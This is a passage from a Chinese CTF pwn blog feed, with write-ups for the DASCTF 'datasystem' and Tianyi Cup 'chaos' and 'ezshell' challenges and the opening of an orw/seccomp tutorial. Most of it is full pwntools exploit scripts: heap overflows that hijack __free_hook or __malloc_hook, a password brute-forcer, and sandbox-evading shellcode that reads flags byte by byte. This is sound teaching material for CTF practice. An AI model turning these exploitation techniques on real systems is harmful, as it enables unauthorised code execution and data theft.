rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>) <br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="datasystem"><a href="#datasystem" class="headerlink" title="datasystem"></a>datasystem</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928153319183.png"><span class="image-caption">image-20210928153319183</span></p>
<p>checksec，64位保护全开</p>
<p>这题是三题里面最复杂的一题，因为在进入真正的程序前，有一个登陆程序，比较复杂，需要花时间进行审计</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928154615068.png"><span class="image-caption">image-20210928154615068</span></p>
<p>开了沙箱</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928162959918.png"><span class="image-caption">image-20210928162959918</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928163032723.png"><span class="image-caption">image-20210928163032723</span></p>
<p>一进入，要先输入账号和密码通过验证，验证通过才能进入真正的有漏洞的程序。账号已经给：admin；密码要自己去找</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928165344870.png"><span class="image-caption">image-20210928165344870</span></p>
<p>我先断点断在比较函数那，看看最终比较的值，第一个参数是我们输入的（原本输入的是八个a），第二个就是要比较的密码。然后我把下一次输入的值换成这个密码</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928165946197.png"><span class="image-caption">image-20210928165946197</span></p>
<p>发现，第二个参数的第一个字符变成了0，那不是截断了吗？但是并没有通过验证，然后我去c代码敲了下，原来是要两个字符串同时都是’\x00’才会通过比较，一个是不行的~</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928170846837.png"><span class="image-caption">image-20210928170846837</span></p>
<p>然后又试了一些随便输入的密码，惊讶的发现，得到的验证密码结果都是一样的，只有复制的密码那次会出现0，看了下wp，大佬推测是位数的问题，只有32位的数字才能让密码为0，我试了下确实是这样的，接下来就是寻找一个可以也让我们输入的密码被加密成首位是’\x00’就可以通过验证</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;error&quot;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>    c = c.to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br>    p = process(<span class="hljs-string">&#x27;./datasystem&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;please input username: &quot;</span>, <span class="hljs-string">&quot;admin\x00&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;please input password: &quot;</span>, c*<span class="hljs-number">32</span>)<br>    msg = p.recvline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Fail&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> msg:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a valid char:&quot;</span>, c)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>    p.close()<br></code></pre></td></tr></table></figure>

<p>这是大佬的爆破脚本，最终获得两个可以通过的值：’c’和’\xec’。然后大佬是用IDA调试的，我以前有尝试过，但是无奈一直报错，但是gdb调试也是一样的，没差</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928171601841.png"><span class="image-caption">image-20210928171601841</span></p>
<p>进入下一个程序了</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928190830374.png"><span class="image-caption">image-20210928190830374</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928190852013.png"><span class="image-caption">image-20210928190852013</span></p>
<p>这边v3返回值因为%s的缘故会把byte_50A0指向的字符全部作为欲写入的字符，而byte_50A0可以查看，全都是a，似乎有0x508个，所以这边在add写入的内容是溢出的。</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928193027743.png"><span class="image-caption">image-20210928193027743</span></p>
<p>万事先泄露libc，这边要先申请再释放一个0x410的堆块，防止进入tcache bin中，然后再申请的得是0x8大小的堆块，因为snprinf会打印个数进去，不能超过八个，否则会把上面残留的bk指针破坏，从而可以泄露出libc地址</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928193842290.png"><span class="image-caption">image-20210928193842290</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928194236357.png"><span class="image-caption">image-20210928194236357</span></p>
<p>然后再反序释放三个堆块，申请回来，就会让上面的堆块是最先被申请的，然后通过溢出把堆块分配到0x23330000写入shellcode，之前再来一遍把fd指针为free_hook，申请过去改为shellcode地址，然后释放一个堆块就会跳转执行shellcode了</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928200129108.png"><span class="image-caption">image-20210928200129108</span></p>
<p>成功！</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928203049261.png"><span class="image-caption">image-20210928203049261</span></p>
<p>不容易，有朝一日我这小菜鸡竟然能赛后“ak”，泪目！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./datasystem&quot;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./datasystem&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27961</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Size: \n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;what&#x27;s your Content: \n&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;please input username: &quot;</span>)<br>p.send(<span class="hljs-string">&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;please input password: &quot;</span>)<br>p.send(<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x410</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;c&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ec090</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x23330000</span>)<br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	mov rdi, 0x23330000</span><br><span class="hljs-string">	xor rsi, rsi</span><br><span class="hljs-string">	mov rax, 2</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string">	</span><br><span class="hljs-string">	mov rdi, rax</span><br><span class="hljs-string">	mov rsi, rsp</span><br><span class="hljs-string">	mov rdx, 0x50</span><br><span class="hljs-string">	xor rax, rax</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov rdi, 1</span><br><span class="hljs-string">	mov rax, 1</span><br><span class="hljs-string">	syscall	</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br>)<br>add(<span class="hljs-number">0x60</span>, payload)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span> + shellcode)<br><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>) + p64(free_hook))<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>, p64(<span class="hljs-number">0x23330000</span> + <span class="hljs-number">0x8</span>))<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2021天翼杯PWN</title>
    <url>/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太菜了，一题没出；又是抱着大佬WP跟着复现~</p>
<p>来源：<a href="http://www.darry-long.top/2021/09/23/2021-%E5%A4%A9%E7%BF%BC%E6%9D%AF-pwn/">http://www.darry-long.top/2021/09/23/2021-%E5%A4%A9%E7%BF%BC%E6%9D%AF-pwn/</a></p>
<h2 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h2><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926091254408.png"><span class="image-caption">image-20210926091254408</span></p>
<p>常规checksec，64位保护全开</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926100956854.png"><span class="image-caption">image-20210926100956854</span></p>
<p>第一次进行比较长的代码审计，对我来说还是比较困难的，基本上都是跟着大佬的注释边写边考虑逻辑</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926101234190.png"><span class="image-caption">image-20210926101234190</span></p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926101445271.png"><span class="image-caption">image-20210926101445271</span></p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926110301065-16326298376511.png"><span class="image-caption">image-20210926110301065</span></p>
<p>这保存的是一个单链表结构，在每个申请出来的堆块上的0x210保存在前一个堆块的地址，在0x208处保存着当前堆块可写入的数据的长度，所以是存在堆溢出的，修改了size就可以修改保存堆块的地址，变成任意地址写或者修改下一块堆块的堆头、fd\bk指针等。因为是单向链表结构，所以是一个一个追溯的，越晚申请的堆块序号越靠前，但是在堆上的地址其实是靠后的</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926121301503.png"><span class="image-caption">image-20210926121301503</span></p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926121807097.png"><span class="image-caption">image-20210926121807097</span></p>
<p>最终在我本地调为符合one_gadget的环境要求，可是不知道为什么最终却没有getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(<span class="hljs-string">&quot;opcode:1\npasswd:Cr4at31\n\r\r\n&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(<span class="hljs-string">&quot;opcode:3\npasswd:Ed1t1\n\r\r\n&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(<span class="hljs-string">&quot;opcode:2\npasswd:SH0w1\n\r\r\n&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(<span class="hljs-string">&quot;opcode:4\npasswd:D3l4te1\n\r\r\n&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x208</span>)<br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x208</span>)<br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x4c0</span><br>log.info(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>	add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>) <span class="hljs-comment">#新申请的为0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>) <span class="hljs-comment">#0</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(heap_addr + <span class="hljs-number">0x2e0</span>))<br>show(<span class="hljs-number">1</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4f432</span><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(mlh - <span class="hljs-number">0x8</span>))<br>edit(<span class="hljs-number">1</span>, p64(ogg) + p64(realloc + <span class="hljs-number">9</span>))<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:1\npasswd:Cr4at31\n\r\r\n&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="ezshell"><a href="#ezshell" class="headerlink" title="ezshell"></a>ezshell</h2><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091318701.png"><span class="image-caption">image-20211003091318701</span></p>
<p>程序很简单，总的说就是输入内容，然后转移到可执行的地址上去执行。</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091835842.png"><span class="image-caption">image-20211003091835842</span></p>
<p>然后开启了沙箱，只允许使用 open 和 read 函数，同时要求 read 函数的 fd 参数右移32位后仍然大于0或者是大等.于4</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091716855.png"><span class="image-caption">image-20211003091716855</span></p>
<p>可写可执行段在0x10000~0x11000</p>
<p>首先orw是没跑了，但是没有write，所以只能是逐字节进行爆破的思想：根据是否异常区分爆破的字符对错。但是我愣是没做出来，算了，思想知道就行，官方wp我跑了本地也没出，差评！</p>
<p>贴个官方的wp好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64  <br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;DEBUG&#x27;</span>]:  <br>    context.log_level = <span class="hljs-string">&quot;debug&quot;</span>  <br>code = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)  <br>context.arch=code.arch  <br>  <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span>(<span class="hljs-params">idx, ch</span>):</span>  <br>    tmp = <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27; </span><br><span class="hljs-string">    open_sec: </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            add al, 2 </span><br><span class="hljs-string">            jmp x </span><br><span class="hljs-string">        y:  pop rdi </span><br><span class="hljs-string">            xor rsi,rsi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            add al, 2 </span><br><span class="hljs-string">            jmp p </span><br><span class="hljs-string">        q:  pop rdi </span><br><span class="hljs-string">            xor rsi,rsi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            push rax </span><br><span class="hljs-string">            pop rdi </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            xor rdx, rdx </span><br><span class="hljs-string">            add dl, 0xff </span><br><span class="hljs-string">            mov rsi, rsp </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            mov al, [rsp+&#123;&#125;] </span><br><span class="hljs-string">            cmp al, &#123;&#125; </span><br><span class="hljs-string">            jne tmp </span><br><span class="hljs-string">            jmp $ </span><br><span class="hljs-string">        tmp: </span><br><span class="hljs-string">            xor rax,rax  </span><br><span class="hljs-string">            add al,60 </span><br><span class="hljs-string">            xor rdi,rdi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">        x: </span><br><span class="hljs-string">            call y </span><br><span class="hljs-string">            .string &quot;./flag&quot; </span><br><span class="hljs-string">        p: </span><br><span class="hljs-string">            call q </span><br><span class="hljs-string">            .string &quot;./flag&quot; </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(idx, <span class="hljs-built_in">ord</span>(ch))  <br>  <br>    shellcode = asm(tmp)  <br>    <span class="hljs-comment"># get alphanumeric shellcode  </span><br>      <br>    <span class="hljs-keyword">return</span> AE64().encode(shellcode, <span class="hljs-string">&#x27;rdx&#x27;</span>).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)  <br>  <br>flag = <span class="hljs-string">&#x27;&#x27;</span>  <br>i = <span class="hljs-number">0</span>  <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> string.printable:  <br>        conn = process(<span class="hljs-string">&quot;./chall&quot;</span>)    <br>        conn.sendlineafter(<span class="hljs-string">&quot;?\n&quot;</span>, payload(i, x))  <br>        <span class="hljs-keyword">try</span>:  <br>            conn.recv(<span class="hljs-number">1</span>, timeout=<span class="hljs-number">1</span>)  <br>        <span class="hljs-keyword">except</span> EOFError:  <br>            conn.close()  <br>            <span class="hljs-keyword">continue</span>  <br>        <span class="hljs-built_in">print</span>(flag,i)  <br>        flag += x  <br>        i += <span class="hljs-number">1</span>  <br>        conn.close()  <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:  <br>            <span class="hljs-built_in">print</span>(flag)  <br>            exit()  <br>        <span class="hljs-keyword">break</span>  <br>  <br>conn.interactive()  <br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>orw</title>
    <url>/2021/09/21/2021-09-21-orw/</url>
    <content><![CDATA[<h2 id="背景前置"><a href="#背景前置" class="headerlink" title="背景前置"></a>背景前置</h2><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p>
<p><code>orw_seccomp函数</code>执行了两次<code>prctl</code>函数（出现prctl就是沙箱的题目）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell">第一次调用prctl函数 ————禁止提权<br>第二次调用prctl函数 ————限制能执行的系统调用只有open，<span class="hljs-built_in">write</span>，<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>

<p>意思就是我们不能使用特殊的系统调用getshell，但是可以用open、read、write三个系统调用去读flag</p>
<h2 id="入门级orw"><a href="#入门级orw" class="headerlink" title="入门级orw"></a>入门级orw</h2><h3 id="一、pwnable-orw"><a href="#一、pwnable-orw" class="headerlink" title="一、pwnable_orw"></a>一、pwnable_orw</h3><p>来自buu上的</p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522121233.png"></p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522121208.png"></p>
<p>首先checksec完，发现只开了canary，放入ida看看。发现，可以输入数据，然后还能对输入的数据进行执行调用。因为这开启沙箱，系统调用是无法执行的，只能通过open打开flag，然后read读到缓冲区上，再通过write泄露出来，从而得到flag</p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522122706.png"></p>
<p>第一个exp是自己去构造执行指令，第二个是用pwntool里面自带的shellcraft的功能。相比之下，第二个会更方便许多</p>
<p>exp的详细解析：（来自<a href="https://blog.csdn.net/qq_44768749/article/details/108256099%EF%BC%89">https://blog.csdn.net/qq_44768749/article/details/108256099）</a></p>
<p>打开flag文件，sys_open(file,0,0)；系统调用号为5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">push 0x0  			#字符串结尾<br>push 0x67616c66		#&#x27;flag&#x27;<br>mov ebx,esp			<br>xor ecx,ecx			#0<br>xor edx,edx			#0<br>mov eax,0x5			#调用号<br>int 0x80			#sys_open(flags,0,0)<br></code></pre></td></tr></table></figure>

<p> 读flag文件，sys_read(3,file,0x100)；系统调用号为3</p>
